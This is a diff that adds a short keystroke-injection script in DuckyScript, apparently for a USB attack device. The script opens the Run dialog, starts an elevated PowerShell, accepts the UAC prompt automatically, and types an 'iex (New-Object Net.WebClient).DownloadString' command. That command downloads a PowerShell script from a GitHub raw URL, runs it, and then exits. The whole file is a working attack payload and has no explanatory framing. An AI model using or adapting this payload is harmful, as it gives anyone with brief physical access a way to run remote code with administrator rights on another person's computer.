@@ -1,0 +1,10 @@
+DELAY 300
+GUI r
+DELAY 200
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+ALT y
+DELAY 800 
+STRING iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/josh-fraser/usbrd/{INSERTNAME}');exit
+ENTER
